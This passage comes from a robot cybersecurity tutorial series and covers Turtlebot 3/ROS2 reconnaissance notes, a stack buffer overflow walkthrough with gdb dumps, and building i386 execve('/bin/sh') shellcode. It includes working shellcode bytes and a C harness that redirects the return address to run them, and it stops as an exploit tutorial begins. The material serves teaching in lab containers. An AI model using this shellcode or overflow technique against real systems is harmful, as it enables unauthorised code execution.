    <ul>
    <li>https://yurichev.com/writings/UAL-EN.pdf as a great resource for assembly. Particularly, 1.30.2 for free/malloc</li>
    </ul>
    <h2 id="wip-tutorial-7-analyzing-turtlebot-3">WIP: Tutorial 7: Analyzing Turtlebot 3</h2>
    <p>This tutorial will research the Turtlebot 3 or TB3 for short. A quick search shows that most of the official content of this robot is for ROS. ROS is completely vulnerable and it makes little sense to try and exploit it since prior research has already shown its vulnerability status. This work will instead focus on a ROS2-specific-TB3.</p>
    <h3 id="background-on-sros-2">Background on SROS 2</h3>
    <ul>
    <li>Note https://ruffsl.github.io/IROS2018_SROS2_Tutorial/</li>
    <li>SROS2 basics https://ruffsl.github.io/IROS2018_SROS2_Tutorial/content/slides/SROS2_Basics.pdf</li>
    <li>https://github.com/ros2/sros2/blob/master/SROS2_Linux.md</li>
    </ul>
    <h3 id="resources-and-exploring-ros-2-setup-for-tb3">Resources and exploring ROS 2 setup for TB3</h3>
    <p>The official manual <span class="sidenote-wrapper"><label for="sn-23" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-23" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> provides an entry point. More interesting that the overall manual is <span class="sidenote-wrapper"><label for="sn-24" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-24" class="margin-toggle"/><span class="sidenote">ROS 2 specific section in TB3 e-manual http://emanual.robotis.com/docs/en/platform/turtlebot3/ros2/<br />
    <br />
    </span></span> which is the ROS2 specific section. A few things of relevance: - Packages for the TB3 seem to be available at <span class="sidenote-wrapper"><label for="sn-25" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-25" class="margin-toggle"/><span class="sidenote">TB3 ROS 2 packages https://github.com/ROBOTIS-GIT/turtlebot3/tree/ros2<br />
    <br />
    </span></span> - Repos are available but don’t seem too filled: - https://github.com/ROBOTIS-GIT/turtlebot3/blob/ros2/turtlebot3.repos - https://github.com/ROBOTIS-GIT/turtlebot3/blob/ros2/turtlebot3_ci.repos</p>
    <p>Searched for docker containers https://hub.docker.com/search?q=turtlebot3&amp;type=image: - https://github.com/TheLurps/turtlebot3_docker seems not updated and ROS1 based - Found Ruffin’s work at https://github.com/ros-swg/turtlebot3_demo, this seems the best spot from where to start. It even has some security aspects configured which will help further investigate it.</p>
    <p>Settling on https://github.com/ros-swg/turtlebot3_demo. It seems that this depends clearly on cartographer which is likely, another component for robots.</p>
    <h4 id="first-steps-exploring-turtlebot3_demo">First steps, exploring turtlebot3_demo</h4>
    <p>Let’s start by cloning the repo and building it locally</p>
    <div class="sourceCode" id="cb151"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb151-1"><a href="#cb151-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/vmayoral/turtlebot3_demo</span>
    <span id="cb151-2"><a href="#cb151-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> turtlebot3_demo</span>
    <span id="cb151-3"><a href="#cb151-3" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build . <span class="at">-t</span> rosswg/turtlebot3_demo</span></code></pre></div>
    <p>then launch it in a Linux machine:</p>
    <div class="sourceCode" id="cb152"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb152-1"><a href="#cb152-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rocker</span> <span class="at">--x11</span> rosswg/turtlebot3_demo:roscon19 <span class="st">&quot;byobu -f configs/secure.conf attach&quot;</span></span></code></pre></div>
    <p>Got myself familiar with the navigation of the environment https://github.com/vmayoral/turtlebot3_demo#running-the-demo. To scroll up/down one can use <code>F7</code> + the arrow lines and then <code>Enter</code> to exit this environment.</p>
    <p>Tried exploring the setup launching <code>aztarna</code>. Found that takes about 4 minutes. Let’s dive a bit more into reconnaissance.</p>
    <h4 id="reconnaissance-2">Reconnaissance</h4>
    <p><em>Moved to <a href="../../1_reconnaissance/robot_footprinting/tutorial3/README.md">Tutorial 3: Footprinting ROS 2 and DDS systems</a></em>.</p>
    <h3 id="resources-8">Resources</h3>
    <ul>
    <li></li>
    <li></li>
    <li></li>
    </ul>
    <h1 id="robot-exploitation-1">Robot exploitation</h1>
    <h2 id="buffer-overflows">Buffer overflows</h2>
    <p>The objective of this tutorial is to show how buffer overflows can affect the behavior of a program. The typical memory layout of a program is as follows:</p>
    <pre><code>                              /------------------\  higher
                                  |                  |  memory
                                  |                  |  addresses
                                  |------------------|
                                  |                  |
                                | |       Stack      |
                        growth  | |                  |
                      direction v |-.-.-.-.-.-.-.-.-.|
                                  |                  |
                                  |                  |
                                  |                  |
                                  |                  |
                                  |                  |
                                  |-.-.-.-.-.-.-.-.-.|
                                ^ |                  |
                        growth  | |       Heap       |
                      direction | |                  |
                                  |------------------|
                                  |   Uninitialized  |
                                  |        Data      |
                                  |       (bss)      |
                                  |------------------|
                                  |    Initialized   |
                                  |        Data      |
                                  |------------------|
                                  |                  |  
                                  |       Text       |  lower
                                  |                  |  memory
                                 \------------------/   addresses</code></pre>
    <p>As described at http://insecure.org/stf/smashstack.html, a stack is an abstract data type frequently used in computer science to represent (likely) the most important technique for structuring programs, functions (or procedures). From one point of view, a function call alters the flow of control just as the <code>jump</code> instruction does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack.</p>
    <p>In this tutorial, we’ll be <em>overflowing</em> (aka, writing more than we should) a buffer in the stack to alter the behavior of a program. This will picture in a very simplistic way one of the main and most relevant problems in cybersecurity. Besides the use of the stack, the following registers are also of relevance:</p>
    <ul>
    <li><strong>(E)SP</strong>: the stack pointer, points to the last address on the stack (or to the next free available address after the stack in some implementations)</li>
    <li><strong>(E)BP</strong>, the frame pointer, facilitates access to local variables.</li>
    </ul>
    <p>The code we will be using to picture the overflow is below:</p>
    <div class="sourceCode" id="cb154"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb154-1"><a href="#cb154-1" aria-hidden="true" tabindex="-1"></a><span class="dv">0</span><span class="op">:</span> <span class="dt">void</span> function<span class="op">(</span><span class="dt">int</span> a<span class="op">,</span> <span class="dt">int</span> b<span class="op">,</span> <span class="dt">int</span> c<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb154-2"><a href="#cb154-2" aria-hidden="true" tabindex="-1"></a><span class="dv">1</span><span class="op">:</span>    <span class="dt">char</span> buffer1<span class="op">[</span><span class="dv">5</span><span class="op">];</span></span>
    <span id="cb154-3"><a href="#cb154-3" aria-hidden="true" tabindex="-1"></a><span class="dv">2</span><span class="op">:</span>    <span class="dt">char</span> buffer2<span class="op">[</span><span class="dv">10</span><span class="op">];</span></span>
    <span id="cb154-4"><a href="#cb154-4" aria-hidden="true" tabindex="-1"></a><span class="dv">3</span><span class="op">:</span>    <span class="dt">int</span> <span class="op">*</span>ret<span class="op">;</span></span>
    <span id="cb154-5"><a href="#cb154-5" aria-hidden="true" tabindex="-1"></a><span class="dv">4</span><span class="op">:</span></span>
    <span id="cb154-6"><a href="#cb154-6" aria-hidden="true" tabindex="-1"></a><span class="dv">5</span><span class="op">:</span>    ret <span class="op">=</span> buffer1 <span class="op">+</span> <span class="dv">26</span><span class="op">;</span></span>
    <span id="cb154-7"><a href="#cb154-7" aria-hidden="true" tabindex="-1"></a><span class="dv">6</span><span class="op">:</span>    <span class="op">(*</span>ret<span class="op">)</span> <span class="op">+=</span> <span class="dv">8</span><span class="op">;</span></span>
    <span id="cb154-8"><a href="#cb154-8" aria-hidden="true" tabindex="-1"></a><span class="dv">7</span><span class="op">:</span> <span class="op">}</span></span>
    <span id="cb154-9"><a href="#cb154-9" aria-hidden="true" tabindex="-1"></a><span class="dv">8</span><span class="op">:</span></span>
    <span id="cb154-10"><a href="#cb154-10" aria-hidden="true" tabindex="-1"></a><span class="dv">9</span><span class="op">:</span> <span class="dt">void</span> main<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb154-11"><a href="#cb154-11" aria-hidden="true" tabindex="-1"></a>a<span class="op">:</span>   <span class="dt">int</span> x<span class="op">;</span></span>
    <span id="cb154-12"><a href="#cb154-12" aria-hidden="true" tabindex="-1"></a>b<span class="op">:</span></span>
    <span id="cb154-13"><a href="#cb154-13" aria-hidden="true" tabindex="-1"></a>c<span class="op">:</span>   x <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb154-14"><a href="#cb154-14" aria-hidden="true" tabindex="-1"></a>d<span class="op">:</span>   function<span class="op">(</span><span class="dv">1</span><span class="op">,</span><span class="dv">2</span><span class="op">,</span><span class="dv">3</span><span class="op">);</span></span>
    <span id="cb154-15"><a href="#cb154-15" aria-hidden="true" tabindex="-1"></a>e<span class="op">:</span>   x <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
    <span id="cb154-16"><a href="#cb154-16" aria-hidden="true" tabindex="-1"></a>f<span class="op">:</span>   printf<span class="op">(</span><span class="st">&quot;%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>x<span class="op">);</span></span>
    <span id="cb154-17"><a href="#cb154-17" aria-hidden="true" tabindex="-1"></a><span class="dv">10</span><span class="op">:</span> <span class="op">}</span></span></code></pre></div>
    <p>To facilitate reproducing this hack, a docker container has been built. The <code>Dockerfile</code> is available within this tutorial and can be built as follows:</p>
    <p><strong>Note</strong>: <em>docker containers match the architecture of the host machine. For simplicity, the container will be built using a 32 bit architecture.</em></p>
    <div class="sourceCode" id="cb155"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb155-1"><a href="#cb155-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity1:latest .</span></code></pre></div>
    <p>Now, run it:</p>
    <div class="sourceCode" id="cb156"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb156-1"><a href="#cb156-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity1:latest</span>
    <span id="cb156-2"><a href="#cb156-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@3c9eab7fde0b:~#</span> ./overflow</span>
    <span id="cb156-3"><a href="#cb156-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span></span></code></pre></div>
    <p>Interestingly, the code jumps over line <code>e</code>:</p>
    <pre><code>e:   x = 1;</code></pre>
    <p>And simply dumps in the standard output the initial and unmodified value of the <code>x</code> variable.</p>
    <p>Let’s analyze the memory to understand why this is happening.</p>
    <h3 id="analyzing-the-memory">Analyzing the memory</h3>
    <p>The docker container has fetched a <code>.gdbinit</code> file which provides a nice environment wherein one can study the internals of the memory. Let’s see the state of the memory and registers at line <code>5</code>: - esp: <code>0xffffd7c0</code> - ebp: <code>0xffffd7e8</code></p>
    <pre><code>0xffffd7c0 ff ff ff ff ee d7 ff ff 34 0c e3 f7 f3 72 e5 f7 ........4 ...r..
    0xffffd7d0 00 00 00 00 00 00 c3 00 01 00 00 00 01 83 04 08 ................
    0xffffd7e0 b8 d9 ff ff 2f 00 00 00 18 d8 ff ff d4 84 04 08 ..../...........
    0xffffd7f0 01 00 00 00 02 00 00 00 03 00 00 00 ad 74 e5 f7 .............t..</code></pre>
    <p>The first observation is that the <code>base pointer</code> is at <code>0xffffd7e8</code> which means that the <em>return</em> address (from <code>function</code>) is 4 bytes after, in other words at <code>0xffffd7ec</code> with a value of <code>d4 84 04 08</code> according to the memory displayed above which transforms into <code>0x080484d4</code> with the right endianness.</p>
    <p>From literature, the memory diagram of the stack is expected to be as follows:</p>
    <pre><code>bottom of                                                                             top of
    memory                                                                                memory
                    ret      buffer2      buffer1   ebp     return      a      b      c
    &lt;-----      [        ][            ][        ][     ][0x080484d4][     ][     ][     ]
    (growth)

    top of                                                                               bottom of
    stack                                                                                   stack</code></pre>
    <p>However it’s not like this. Newer compilers (gcc), play tricks on the memory layout to prevent overflows and malicious attacks. In particular, the local variables have the following locations:</p>
    <pre><code>&gt;&gt;&gt; p &amp;buffer1
    $1 = (char (*)[5]) 0xffffd7d2
    &gt;&gt;&gt; p &amp;buffer2
    $2 = (char (*)[10]) 0xffffd7d2
    &gt;&gt;&gt; p &amp;ret
    $3 = (int **) 0xffffd7cc</code></pre>
    <p>It’s interesting to note that both, <code>buffer1</code> and <code>buffer2</code> point to the same address. Likely, due to the fact that both variables aren’t used within the code.</p>
    <p>Lines of code <code>5</code> and <code>6</code> aim to modify a value in the stack:</p>
    <pre><code>5:    ret = buffer1 + 26;
    6:    (*ret) += 8;</code></pre>
    <p>Knowing that <code>buffer1 = 0xffffd7d2</code> then <code>ret</code> will be:</p>
    <pre><code>&gt;&gt;&gt; p 0xffffd7d2 + 26
    $5 = 4294957036</code></pre>
    <p>Which in hexadecimal is <code>0xffffd7ec</code>. Not surprisingly, <strong>this address is exactly the same as the one of the return address</strong>. Line <code>6</code> of code adds <code>8</code> to the <em>value</em> of the return address which results in a memory layout as follows (the change has been [highlighted]):</p>
    <pre><code>0xffffd7c0 ff ff ff ff ee d7 ff ff 34 0c e3 f7 ec d7 ff ff ........4 ......
    0xffffd7d0 00 00 00 00 00 00 c3 00 01 00 00 00 00 8d 5a f7 ..............Z.
    0xffffd7e0 b8 d9 ff ff 2f 00 00 00 18 d8 ff ff [dc 84 04 08] ..../...........
    0xffffd7f0 01 00 00 00 02 00 00 00 03 00 00 00 ad 74 e5 f7 .............t..</code></pre>
    <p>To understand the rationale behind this, let’s look at the assembly code of the <code>main</code> function:</p>
    <pre><code>&gt;&gt;&gt; disassemble main
    Dump of assembler code for function main:
       0x080484a7 &lt;+0&gt;: push   %ebp
       0x080484a8 &lt;+1&gt;: mov    %esp,%ebp
       0x080484aa &lt;+3&gt;: and    $0xfffffff0,%esp
       0x080484ad &lt;+6&gt;: sub    $0x20,%esp
       0x080484b0 &lt;+9&gt;: movl   $0x0,0x1c(%esp)
       0x080484b8 &lt;+17&gt;:    movl   $0x3,0x8(%esp)
       0x080484c0 &lt;+25&gt;:    movl   $0x2,0x4(%esp)
       0x080484c8 &lt;+33&gt;:    movl   $0x1,(%esp)
       0x080484cf &lt;+40&gt;:    call   0x804846d &lt;function&gt;
       0x080484d4 &lt;+45&gt;:    movl   $0x1,0x1c(%esp)
       0x080484dc &lt;+53&gt;:    mov    0x1c(%esp),%eax
       0x080484e0 &lt;+57&gt;:    mov    %eax,0x4(%esp)
       0x080484e4 &lt;+61&gt;:    movl   $0x8048590,(%esp)
       0x080484eb &lt;+68&gt;:    call   0x8048330 &lt;printf@plt&gt;
       0x080484f0 &lt;+73&gt;:    leave  
       0x080484f1 &lt;+74&gt;:    ret    
    End of assembler dump.</code></pre>
    <p>Note that in address <code>0x080484cf &lt;+40&gt;</code> a call to <code>function</code> is produced and the return address <code>0x080484d4</code> (the address of the next assembly instruction) is pushed into the stack.</p>
    <p>Putting all together, the <code>overflow.c</code> program is modifying the <em>return address</em> and adding 8 bytes pointing to <code>0x080484dc</code> so that the instruction at <code>0x080484d4</code> (<code>movl   $0x1,0x1c(%esp)</code>) is skipped which results in the program printing the initial value of variable <code>x</code>.</p>
    <h3 id="resources-9">Resources</h3>
    <ul>
    <li>[1] M. Hicks (2014), ‘Software Security’, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <a href="https://www.coursera.org/learn/software-security" class="uri">https://www.coursera.org/learn/software-security</a>.</li>
    <li>[2] CERN Computer Security Team (2018, February 12). <em>Memory Layout of C Programs</em>. Retrieved from https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml.</li>
    <li>[3] A. One (1996). Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.</li>
    <li>[4] P. Bright (2015), <em>How security flaws work: The buffer overflow</em>. Retrieved from https://arstechnica.com/information-technology/2015/08/how-security-flaws-work-the-buffer-overflow/.</li>
    </ul>
    <h2 id="building-shellcode">Building shellcode</h2>
    <p>The term <em>shellcode</em> is typically used to refer to that piece of code which allows to spawn a command line in the targeting system. This can be done from any process in execution provided it invokes the right call. This tutorial will focus on understanding a <em>shellcode</em> for i386 systems and how it’s typically used.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb165"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb165-1"><a href="#cb165-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity2:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb166"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb166-1"><a href="#cb166-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity2:latest</span></code></pre></div>
    <hr />
    <p>The code to spawn a shell in C looks like (<code>shellcode.c</code>):</p>
    <div class="sourceCode" id="cb167"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb167-1"><a href="#cb167-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb167-2"><a href="#cb167-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb167-3"><a href="#cb167-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> main<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb167-4"><a href="#cb167-4" aria-hidden="true" tabindex="-1"></a>   <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
    <span id="cb167-5"><a href="#cb167-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb167-6"><a href="#cb167-6" aria-hidden="true" tabindex="-1"></a>   name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
    <span id="cb167-7"><a href="#cb167-7" aria-hidden="true" tabindex="-1"></a>   name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb167-8"><a href="#cb167-8" aria-hidden="true" tabindex="-1"></a>   execve<span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name<span class="op">,</span> NULL<span class="op">);</span></span>
    <span id="cb167-9"><a href="#cb167-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>executing, it clearly gives us a shell:</p>
    <div class="sourceCode" id="cb168"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb168-1"><a href="#cb168-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@1406e08c64b9:~#</span> ./shellcode</span>
    <span id="cb168-2"><a href="#cb168-2" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span></code></pre></div>
    <p>Reading through literature [2], one can summarize that this C program consist of the following steps in assembly:</p>
    <ul>
    <li><ol type="a">
    <li>Have the null terminated string “/bin/sh” somewhere in memory.</li>
    </ol></li>
    <li><ol start="2" type="a">
    <li>Have the address of the string “/bin/sh” somewhere in memory followed by a null long word.</li>
    </ol></li>
    <li><ol start="3" type="a">
    <li>Copy 0xb into the EAX register.</li>
    </ol></li>
    <li><ol start="4" type="a">
    <li>Copy the address of the address of the string “/bin/sh” into the EBX register.</li>
    </ol></li>
    <li><ol start="5" type="a">
    <li>Copy the address of the string “/bin/sh” into the ECX register.</li>
    </ol></li>
    <li><ol start="6" type="a">
    <li>Copy the address of the null long word into the EDX register.</li>
    </ol></li>
    <li><ol start="7" type="a">
    <li>Execute the int $0x80 instruction.</li>
    </ol></li>
    <li><ol start="8" type="a">
    <li>Copy 0x1 into the EAX register.</li>
    </ol></li>
    <li><ol type="i">
    <li>Copy 0x0 into the EBX register.</li>
    </ol></li>
    <li><ol start="10" type="a">
    <li>Execute the int $0x80 instruction.</li>
    </ol></li>
    </ul>
    <p>From [3], we can put together the following complete program assembled together in C (<code>shellcodeasm.c</code>):</p>
    <div class="sourceCode" id="cb169"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb169-1"><a href="#cb169-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> main<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb169-2"><a href="#cb169-2" aria-hidden="true" tabindex="-1"></a>__asm__<span class="op">(</span><span class="st">&quot; \</span></span>
    <span id="cb169-3"><a href="#cb169-3" aria-hidden="true" tabindex="-1"></a><span class="st">          xor     %eax,       %eax; \</span></span>
    <span id="cb169-4"><a href="#cb169-4" aria-hidden="true" tabindex="-1"></a><span class="st">          xor     %edx,       %edx; \</span></span>
    <span id="cb169-5"><a href="#cb169-5" aria-hidden="true" tabindex="-1"></a><span class="st">          movb    $11,        %al; \</span></span>
    <span id="cb169-6"><a href="#cb169-6" aria-hidden="true" tabindex="-1"></a><span class="st">          push    %edx; \</span></span>
    <span id="cb169-7"><a href="#cb169-7" aria-hidden="true" tabindex="-1"></a><span class="st">          push    $0x68732f6e; \</span></span>
    <span id="cb169-8"><a href="#cb169-8" aria-hidden="true" tabindex="-1"></a><span class="st">          push    $0x69622f2f; \</span></span>
    <span id="cb169-9"><a href="#cb169-9" aria-hidden="true" tabindex="-1"></a><span class="st">          mov     %esp,       %ebx; \</span></span>
    <span id="cb169-10"><a href="#cb169-10" aria-hidden="true" tabindex="-1"></a><span class="st">          push    %edx; \</span></span>
    <span id="cb169-11"><a href="#cb169-11" aria-hidden="true" tabindex="-1"></a><span class="st">          push    %ebx; \</span></span>
    <span id="cb169-12"><a href="#cb169-12" aria-hidden="true" tabindex="-1"></a><span class="st">          mov     %esp,       %ecx; \</span></span>
    <span id="cb169-13"><a href="#cb169-13" aria-hidden="true" tabindex="-1"></a><span class="st">          int     $0x80; \</span></span>
    <span id="cb169-14"><a href="#cb169-14" aria-hidden="true" tabindex="-1"></a><span class="st">          movl   $0x1, %eax; \</span></span>
    <span id="cb169-15"><a href="#cb169-15" aria-hidden="true" tabindex="-1"></a><span class="st">          movl   $0x0, %ebx;  \</span></span>
    <span id="cb169-16"><a href="#cb169-16" aria-hidden="true" tabindex="-1"></a><span class="st">          int    $0x80;&quot;</span><span class="op">);</span></span>
    <span id="cb169-17"><a href="#cb169-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>executing, it clearly gives us a shell:</p>
    <div class="sourceCode" id="cb170"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb170-1"><a href="#cb170-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@1406e08c64b9:~#</span> ./shellcodeasm</span>
    <span id="cb170-2"><a href="#cb170-2" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span></code></pre></div>
    <p>and disassembling it, we obtain the same (plus the corresponding instructions for the stack management at the beginning and end):</p>
    <pre><code>&gt;&gt;&gt; disassemble main
    Dump of assembler code for function main:
       0x080483ed &lt;+0&gt;: push   %ebp
       0x080483ee &lt;+1&gt;: mov    %esp,%ebp
       0x080483f0 &lt;+3&gt;: xor    %eax,%eax
       0x080483f2 &lt;+5&gt;: xor    %edx,%edx
       0x080483f4 &lt;+7&gt;: mov    $0xb,%al
       0x080483f6 &lt;+9&gt;: push   %edx
       0x080483f7 &lt;+10&gt;:    push   $0x68732f6e
       0x080483fc &lt;+15&gt;:    push   $0x69622f2f
       0x08048401 &lt;+20&gt;:    mov    %esp,%ebx
       0x08048403 &lt;+22&gt;:    push   %edx
       0x08048404 &lt;+23&gt;:    push   %ebx
       0x08048405 &lt;+24&gt;:    mov    %esp,%ecx
       0x08048407 &lt;+26&gt;:    int    $0x80
       0x08048409 &lt;+28&gt;:    mov    $0x1,%eax
       0x0804840e &lt;+33&gt;:    mov    $0x0,%ebx
       0x08048413 &lt;+38&gt;:    int    $0x80
       0x08048415 &lt;+40&gt;:    pop    %ebp
       0x08048416 &lt;+41&gt;:    ret    
    End of assembler dump.</code></pre>
    <p>Now, a more compact version of the shellcode can be obtained by fetching the hexadecimal representation of all those assembly instructions above which can be obtained by directly looking at the memory:</p>
    <pre><code>&gt;&gt;&gt; x/37bx 0x080483f0
    0x80483f0 &lt;main+3&gt;: 0x31    0xc0    0x31    0xd2    0xb0    0x0b    0x52    0x68
    0x80483f8 &lt;main+11&gt;:    0x6e    0x2f    0x73    0x68    0x68    0x2f    0x2f    0x62
    0x8048400 &lt;main+19&gt;:    0x69    0x89    0xe3    0x52    0x53    0x89    0xe1    0xcd
    0x8048408 &lt;main+27&gt;:    0x80    0xb8    0x01    0x00    0x00    0x00    0xbb    0x00
    0x8048410 &lt;main+35&gt;:    0x00    0x00    0x00    0xcd    0x80</code></pre>
    <p>a total of 37 bytes of <em>shellcode</em>. Let’s try it out:</p>
    <div class="sourceCode" id="cb173"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb173-1"><a href="#cb173-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span></span>
    <span id="cb173-2"><a href="#cb173-2" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;</span><span class="sc">\x31\xc0\x31\xd2\xb0\x0b\x52\x68</span><span class="st">&quot;</span></span>
    <span id="cb173-3"><a href="#cb173-3" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;</span><span class="sc">\x6e\x2f\x73\x68\x68\x2f\x2f\x62</span><span class="st">&quot;</span></span>
    <span id="cb173-4"><a href="#cb173-4" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;</span><span class="sc">\x69\x89\xe3\x52\x53\x89\xe1\xcd</span><span class="st">&quot;</span></span>
    <span id="cb173-5"><a href="#cb173-5" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;</span><span class="sc">\x80\xb8\x01\x00\x00\x00\xbb\x00</span><span class="st">&quot;</span></span>
    <span id="cb173-6"><a href="#cb173-6" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;</span><span class="sc">\x00\x00\x00\xcd\x80</span><span class="st">&quot;</span><span class="op">;</span></span>
    <span id="cb173-7"><a href="#cb173-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb173-8"><a href="#cb173-8" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> main<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb173-9"><a href="#cb173-9" aria-hidden="true" tabindex="-1"></a>   <span class="dt">int</span> <span class="op">*</span>ret<span class="op">;</span>    <span class="co">// a variable that will hold the return address in the stack</span></span>
    <span id="cb173-10"><a href="#cb173-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb173-11"><a href="#cb173-11" aria-hidden="true" tabindex="-1"></a>   ret <span class="op">=</span> <span class="op">(</span><span class="dt">int</span> <span class="op">*)&amp;</span>ret <span class="op">+</span> <span class="dv">2</span><span class="op">;</span> <span class="co">// obtain the return address from the stack</span></span>
    <span id="cb173-12"><a href="#cb173-12" aria-hidden="true" tabindex="-1"></a>   <span class="op">(*</span>ret<span class="op">)</span> <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">)</span>shellcode<span class="op">;</span> <span class="co">// point the return address to the shellcode</span></span>
    <span id="cb173-13"><a href="#cb173-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Code is self-explanatory, a local variable <code>ret</code> gets pointed to the return address which later gets modified to point at the global variable <code>shellcode</code> which contains the previously derived shell code. To make this work in a simple manner, we will disable gcc’s stack protection mechanism producing:</p>
    <div class="sourceCode" id="cb174"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb174-1"><a href="#cb174-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@51b56809b3b6:~#</span> ./test_shellcode</span>
    <span id="cb174-2"><a href="#cb174-2" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span></code></pre></div>
    <h3 id="resources-10">Resources</h3>
    <ul>
    <li>[1] M. Hicks (2014), <em>Software Security</em>, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <a href="https://www.coursera.org/learn/software-security" class="uri">https://www.coursera.org/learn/software-security</a>.</li>
    <li>[2] A. One (1996), Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.</li>
    <li>[3] P. Clement (2011), <em>execve(“/bin//sh”, [“/bin//sh”], NULL) - Linux elf32-i386</em>. Retrieved from https://blog.thireus.com/execvebinsh-binsh-null/</li>
    </ul>
    <h2 id="exploiting">Exploiting</h2>
    <p>In this tutorial we’ll review how to proceed with a buffer overflow and exploit it.</p>
    <p>Content is heavily based on [1]:</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb175"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb175-1"><a href="#cb175-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity3:latest .</span></code></pre></div>
    <p>and run with:</p>
    <div class="sourceCode" id="cb176"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb176-1"><a href="#cb176-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity3:latest</span></code></pre></div>
    <hr />
    <p>We’ll be using two binaries <code>vulnerable</code> (the vulnerable program which takes a parameter) and <code>exploit2</code>, a program that takes as a parameter a buffer size, and an offset from its own stack pointer (where we believe the buffer we want to overflow may live).</p>
